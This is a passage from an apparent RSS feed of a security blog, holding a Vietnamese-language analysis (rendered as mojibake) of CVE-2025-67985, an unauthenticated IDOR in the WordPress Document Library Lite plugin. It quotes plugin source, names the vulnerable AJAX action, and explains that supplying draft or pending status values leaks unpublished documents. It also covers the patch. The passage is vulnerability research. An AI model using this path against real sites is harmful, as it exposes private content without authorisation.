Schedule Plugin &amp;lt;= 2.4.15 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-67985 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-20-cve-2025-67985/</link>
      <pubDate>Sat, 20 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-20-cve-2025-67985/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;b·ªè qua ki·ªÉm so√°t ph√¢n quy·ªÅn th√¥ng qua kh√≥a do ng∆∞·ªùi d√πng ki·ªÉm so√°t&lt;/strong&gt; trong plugin &lt;strong&gt;Document Library Lite&lt;/strong&gt; c·ªßa &lt;strong&gt;Barn2 Plugins&lt;/strong&gt; cho ph√©p khai th√°c &lt;strong&gt;c√°c m·ª©c b·∫£o m·∫≠t ki·ªÉm so√°t truy c·∫≠p ƒë∆∞·ª£c c·∫•u h√¨nh kh√¥ng ƒë√∫ng&lt;/strong&gt;.&#xA;L·ªó h·ªïng n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;Document Library Lite&lt;/strong&gt; t·ª´ &lt;strong&gt;kh√¥ng x√°c ƒë·ªãnh&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;phi√™n b·∫£n 1.1.7 tr·ªü xu·ªëng&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-67985&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-67985&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure direct object references (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/document-library-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Document Library Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Document Library Lite&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.6&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.0&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;L·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë ·∫£nh h∆∞·ªüng t·ª´ phi√™n b·∫£n 1.1.7 tr·ªü xu·ªëng nh∆∞ng th·ª±c ch·∫•t ƒë√£ ƒë∆∞·ª£c v√° trong phi√™n b·∫£n 1.1.7. Ta t·∫£i xu·ªëng phi√™n b·∫£n 1.1.6 ƒë·ªÉ ph√¢n t√≠ch.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_dll_load_posts&amp;#39;, [ $this, &amp;#39;load_posts&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; l√† hook d√†nh cho t·∫•t c·∫£ ng∆∞·ªùi d√πng (k·ªÉ c·∫£ ch∆∞a ƒëƒÉng nh·∫≠p). B·∫•t k·ª≥ ai ƒë·ªÅu c√≥ th·ªÉ g·ªçi AJAX action:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=dll_load_posts&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V√† th·ª±c thi h√†m &lt;code&gt;load_posts()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const SHORTCODE = &amp;#39;doc_library&amp;#39;;&#xA;public function load_posts() {&#xA;    $args = Options::handle_shortcode_attribute_aliases( $_POST[ &amp;#39;args&amp;#39; ] );&#xA;    $args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );&#xA;&#xA;    $table = new simple_Document_Library( $args );&#xA;    $response = $table-&amp;gt;get_table( &amp;#39;array&amp;#39; );&#xA;&#xA;    // Return the response as JSON&#xA;    wp_send_json($response);   &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;load_posts()&lt;/code&gt; g·ªçi ƒë·∫øn &lt;code&gt;handle_shortcode_attribute_aliases&lt;/code&gt; v·ªõi tham s·ªë ƒë·∫ßu v√†o &lt;code&gt;$_POST[ &#39;args&#39; ]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function handle_shortcode_attribute_aliases( $atts ) {&#xA;    if ( isset( $atts[&amp;#39;content&amp;#39;] ) ) {&#xA;        $atts[&amp;#39;columns&amp;#39;] = $atts[&amp;#39;content&amp;#39;];&#xA;        unset( $atts[&amp;#39;content&amp;#39;] );&#xA;    }&#xA;&#xA;    if ( isset( $atts[&amp;#39;docs_per_page&amp;#39;] ) ) {&#xA;        $atts[&amp;#39;rows_per_page&amp;#39;] = $atts[&amp;#39;docs_per_page&amp;#39;];&#xA;        unset( $atts[&amp;#39;docs_per_page&amp;#39;] );&#xA;    }&#xA;&#xA;    return $atts;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y ch·ªâ th·ª±c hi·ªán √°nh x·∫° (ƒë·ªïi t√™n) tham s·ªë:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;content&lt;/code&gt; ‚Üí &lt;code&gt;columns&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;docs_per_page&lt;/code&gt; ‚Üí &lt;code&gt;rows_per_page&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau ƒë√≥ tr·∫£ l·∫°i m·∫£ng &lt;code&gt;$atts&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp theo h√†m &lt;code&gt;load_posts()&lt;/code&gt; g·ªçi ƒë·∫øn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nh·∫±m g·ªôp tham s·ªë m·∫∑c ƒë·ªãnh (&lt;code&gt;Options::get_defaults()&lt;/code&gt;) v·ªõi &lt;code&gt;$args&lt;/code&gt; do ng∆∞·ªùi d√πng truy·ªÅn v√†o:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/option.png&#34; title=&#34;C√°c option m·∫∑c ƒë·ªãnh c·ªßa shortcode&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/option.png&#34; data-sub-html=&#34;&lt;h2&gt;Option&lt;/h2&gt;&lt;p&gt;C√°c option m·∫∑c ƒë·ªãnh c·ªßa shortcode&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/option.png&#39; alt=&#34;Option&#34; height=&#34;475&#34; width=&#34;669&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;C√°c option m·∫∑c ƒë·ªãnh c·ªßa shortcode&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong ƒë√≥, &lt;code&gt;status&lt;/code&gt; quy·∫øt ƒë·ªãnh tr·∫°ng th√°i document ƒë∆∞·ª£c hi·ªÉn th·ªã.&lt;/p&gt;&#xA;&lt;p&gt;C√≥ th·ªÉ thay ƒë·ªïi status c·ªßa Document khi t·∫°o/edit:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/status.png&#34; title=&#34;Thay ƒë·ªëi status&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/status.png&#34; data-sub-html=&#34;&lt;h2&gt;Status&lt;/h2&gt;&lt;p&gt;Thay ƒë·ªëi status&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/status.png&#39; alt=&#34;Status&#34; height=&#34;581&#34; width=&#34;1518&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thay ƒë·ªëi status&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;pending&lt;/code&gt; v√† &lt;code&gt;draft&lt;/code&gt; l√† tr·∫°ng th√°i ch∆∞a c√¥ng khai c·ªßa document. Ch·ªâ nh·ªØng ng∆∞·ªùi c√≥ quy·ªÅn m·ªõi xem ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;load_posts()&lt;/code&gt; kh·ªüi t·∫°o &lt;code&gt;simple_Document_Library&lt;/code&gt; v·ªõi &lt;code&gt;$args&lt;/code&gt; do ng∆∞·ªùi d√πng cung c·∫•p:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$table = new simple_Document_Library( $args );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;validate_options()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong constructor c·ªßa &lt;code&gt;simple_Document_Library&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct( $args ) {&#xA;    $this-&amp;gt;args = $this-&amp;gt;validate_options( $args );&#xA;    $this-&amp;gt;set_post_args();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;·ªû ƒë√¢y kh√¥ng ch·ªâ t·ªìn t·∫°i 3 tr·∫°ng th√°i: &lt;code&gt;publish&lt;/code&gt;, &lt;code&gt;pending&lt;/code&gt;, &lt;code&gt;draft&lt;/code&gt; m√† c√≤n 2 tr·∫°ng th√°i &lt;code&gt;future&lt;/code&gt; v√† &lt;code&gt;any&lt;/code&gt; xu·∫•t hi·ªán trong h√†m &lt;code&gt;validate_options&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function validate_options( $args ) {&#xA;    // Validate all the boolean options in the database&#xA;    $boolean_options = [ &amp;#39;lazy_load&amp;#39;, &amp;#39;lightbox&amp;#39;, &amp;#39;wrap&amp;#39;, &amp;#39;search_on_click&amp;#39; ];&#xA;&#xA;    foreach( $boolean_options as $option ) {&#xA;        $args[ $option ] = is_string( $args[ $option ] ) ? $args[ $option ] === &amp;#34;true&amp;#34; : $args[ $option ];&#xA;    }&#xA;&#xA;    // The post status can only have these values&#xA;    $valid_post_statuses = [ &amp;#39;publish&amp;#39;, &amp;#39;pending&amp;#39;, &amp;#39;draft&amp;#39;, &amp;#39;future&amp;#39;, &amp;#39;any&amp;#39; ];&#xA;    $args[ &amp;#39;status&amp;#39; ] = in_array( $args[&amp;#39;status&amp;#39;], $valid_post_statuses ) ? $args[ &amp;#39;status&amp;#39; ] : &amp;#39;publish&amp;#39;;&#xA;    &#xA;    return $args;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y ch·ªâ ki·ªÉm tra gi√° tr·ªã h·ª£p l·ªá, kh√¥ng ki·ªÉm tra quy·ªÅn.&lt;/p&gt;&#xA;&lt;p&gt;status cho ph√©p &lt;code&gt;pending&lt;/code&gt;, &lt;code&gt;draft&lt;/code&gt;, &lt;code&gt;future&lt;/code&gt;, &lt;code&gt;any&lt;/code&gt;, n√™n user c√≥ th·ªÉ d√πng c√°c gi√° tr·ªã n√†y ƒë·ªÉ xem document ch∆∞a ƒë∆∞·ª£c ph√©p c√¥ng khai ‚Üí &lt;strong&gt;bypass ph√¢n quy·ªÅn&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = $table-&amp;gt;get_table( &amp;#39;array&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_table&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_table( $output_type = &amp;#39;html&amp;#39; ) {&#xA;    $columns = $this-&amp;gt;get_columns();&#xA;&#xA;    // Parse DataTables parameters from the AJAX request&#xA;    $draw   = isset( $_POST[&amp;#39;draw&amp;#39;] ) ? intval( $_POST[&amp;#39;draw&amp;#39;] ) : 1;&#xA;    $this-&amp;gt;args[&amp;#39;offset&amp;#39;]  = isset( $_POST[&amp;#39;start&amp;#39;] ) ? intval( $_POST[&amp;#39;start&amp;#39;] ) : 0;&#xA;    $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = isset( $_POST[&amp;#39;length&amp;#39;] ) &amp;amp;&amp;amp; intval( $_POST[&amp;#39;length&amp;#39;] ) !== -1 ? intval( $_POST[&amp;#39;length&amp;#39;] ) : $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;];&#xA;    $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] = isset( $_POST[&amp;#39;order&amp;#39;] ) ? $columns[$_POST[&amp;#39;order&amp;#39;][0][&amp;#39;column&amp;#39;]] : $this-&amp;gt;get_orderby();&#xA;    $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = isset( $_POST[&amp;#39;order&amp;#39;] ) ? $_POST[&amp;#39;order&amp;#39;][0][&amp;#39;dir&amp;#39;] : $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;];&#xA;    $this-&amp;gt;args[&amp;#39;search_value&amp;#39;] = isset( $_POST[&amp;#39;search&amp;#39;] ) ? $_POST[&amp;#39;search&amp;#39;][&amp;#39;value&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = filter_var( $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;], FILTER_VALIDATE_INT );&#xA;&#xA;    if ( $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] &amp;lt; 1 || ! $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] ) {&#xA;        $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = false;&#xA;    }&#xA;    if( isset( $_POST[&amp;#39;category&amp;#39;] ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;doc_category&amp;#39;] = $_POST[&amp;#39;category&amp;#39;];&#xA;    }&#xA;&#xA;    if ( ! in_array( $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;], Options::get_allowed_columns(), true ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] = Options::get_default_settings()[&amp;#39;sort_by&amp;#39;];&#xA;    }&#xA;&#xA;    if ( ! in_array( $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;], [ &amp;#39;asc&amp;#39;, &amp;#39;desc&amp;#39; ], true ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = Options::get_default_settings()[&amp;#39;sort_order&amp;#39;];&#xA;    }&#xA;&#xA;    // Set default sort direction&#xA;    if ( ! $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] ) {&#xA;        if ( $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] === &amp;#39;date&amp;#39; ) {&#xA;            $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = &amp;#39;desc&amp;#39;;&#xA;        } else {&#xA;            $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = &amp;#39;asc&amp;#39;;&#xA;        }&#xA;    }&#xA;&#xA;    $this-&amp;gt;args[&amp;#39;content_length&amp;#39;]  = filter_var( $this-&amp;gt;args[&amp;#39;content_length&amp;#39;], FILTER_VALIDATE_INT );&#xA;    $this-&amp;gt;args[&amp;#39;scroll_offset&amp;#39;]   = filter_var( $this-&amp;gt;args[&amp;#39;scroll_offset&amp;#39;], FILTER_VALIDATE_INT );&#xA;&#xA;    if ( empty( $this-&amp;gt;args[&amp;#39;date_format&amp;#39;] ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;date_format&amp;#39;] = Options::get_default_settings()[&amp;#39;date_format&amp;#39;];&#xA;    }&#xA;&#xA;    $output       = &amp;#39;&amp;#39;;&#xA;    $table_body   = &amp;#39;&amp;#39;;&#xA;    $body_row_fmt = &amp;#39;&amp;#39;;&#xA;&#xA;    // After an AJAX request, the paramaters should be set again&#xA;    $this-&amp;gt;set_post_args();&#xA;    // Get all published posts in the current language&#xA;    $all_posts = $this-&amp;gt;run_table_query( $this-&amp;gt;build_table_query( $this-&amp;gt;post_args ) );&#xA;&#xA;    // Bail early if no posts found&#xA;    if ( ! $all_posts || ! is_array( $all_posts ) ) {&#xA;        return $output;&#xA;    }&#xA;    &#xA;    // Add placeholder to table body format string so that content for this column is included in table output&#xA;    $cell_fmt     = &amp;#39;&amp;lt;td&amp;gt;{%s}&amp;lt;/td&amp;gt;&amp;#39;;&#xA;    $array_output = [];&#xA;    foreach ( $columns as $column ) {&#xA;        $body_row_fmt .= sprintf( $cell_fmt, $column );&#xA;    }&#xA;    if ( $output_type === &amp;#39;html&amp;#39; ) {&#xA;        // Build table body&#xA;        $body_row_fmt = &amp;#39;&amp;lt;tr&amp;gt;&amp;#39; . $body_row_fmt . &amp;#39;&amp;lt;/tr&amp;gt;&amp;#39;;&#xA;&#xA;        // Loop through posts and add a row for each&#xA;        foreach ( (array) $all_posts as $_post ) {&#xA;            setup_postdata( $_post );&#xA;&#xA;            $post_data_trans = apply_filters(&#xA;                &amp;#39;document_library_table_row_data_format&amp;#39;,&#xA;                $this-&amp;gt;get_row_content( $_post )&#xA;            );&#xA;&#xA;            $table_body .= strtr( $body_row_fmt, $post_data_trans );&#xA;        } // foreach post&#xA;&#xA;        wp_reset_postdata();&#xA;        return $table_body;&#xA;    } else {&#xA;        // Loop through posts and add a row for each&#xA;        foreach ( (array) $all_posts as $_post ) {&#xA;            setup_postdata( $_post );&#xA;            $array_output[] = $this-&amp;gt;get_row_content( $_post );&#xA;        }&#xA;    }&#xA;&#xA;    // Increment the table count&#xA;    &amp;#43;&amp;#43;self::$table_count;&#xA;    if ( $output_type === &amp;#39;html&amp;#39; ) {&#xA;        return apply_filters( &amp;#39;document_library_table_html_output&amp;#39;, $output, $this-&amp;gt;args );&#xA;    } else {&#xA;        $total_posts = $this-&amp;gt;get_total_posts();&#xA;&#xA;        // Prepare the response&#xA;        $response = [&#xA;            &amp;#39;draw&amp;#39;            =&amp;gt; $draw,&#xA;            &amp;#39;recordsTotal&amp;#39;    =&amp;gt; $total_posts,&#xA;            &amp;#39;recordsFiltered&amp;#39; =&amp;gt; $total_posts, // You can filter further if you add search functionality&#xA;            &amp;#39;data&amp;#39;            =&amp;gt; $array_output,&#xA;        ];&#xA;&#xA;        wp_send_json( $response );&#xA;&#xA;        // return &amp;#34;&amp;#34;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_table()&lt;/code&gt; l·∫•y nhi·ªÅu tham s·ªë tr·ª±c ti·∫øp t·ª´ &lt;code&gt;$_POST&lt;/code&gt;, g√°n v√†o &lt;code&gt;$this-&amp;gt;args&lt;/code&gt; v√† d√πng ch√∫ng ƒë·ªÉ x√¢y d·ª±ng, th·ª±c thi truy v·∫•n document m√† &lt;strong&gt;kh√¥ng ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng&lt;/strong&gt;. Do &lt;code&gt;$args&lt;/code&gt; ban ƒë·∫ßu (bao g·ªìm &lt;code&gt;status&lt;/code&gt;) l√† d·ªØ li·ªáu do client ki·ªÉm so√°t, ng∆∞·ªùi d√πng c√≥ th·ªÉ truy v·∫•n v√† nh·∫≠n v·ªÅ c√°c document ·ªü tr·∫°ng th√°i &lt;code&gt;pending&lt;/code&gt; ho·∫∑c &lt;code&gt;draft&lt;/code&gt;, k·∫øt qu·∫£ ƒë∆∞·ª£c tr·∫£ th·∫≥ng qua JSON, d·∫´n t·ªõi &lt;strong&gt;bypass ph√¢n quy·ªÅn / IDOR&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng, &lt;code&gt;wp_send_json($response)&lt;/code&gt; &lt;strong&gt;tr·∫£ to√†n b·ªô d·ªØ li·ªáu document cho client&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_send_json($response);   &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ ch·∫∑n tri·ªát ƒë·ªÉ l·ªó h·ªïng b·∫±ng c√°ch:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;√âp user ch∆∞a ƒëƒÉng nh·∫≠p ch·ªâ ƒë∆∞·ª£c xem document &lt;code&gt;publish&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu status kh√°c &lt;code&gt;publish&lt;/code&gt; m√† ng∆∞·ªùi d√πng kh√¥ng c√≥ quy·ªÅn &lt;code&gt;edit_posts&lt;/code&gt; =&amp;gt; tr·∫£ v·ªÅ &lt;code&gt;error&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/patch.png&#34; title=&#34;B·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/patch.png&#39; alt=&#34;Patch&#34; height=&#34;612&#34; width=&#34;1519&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a 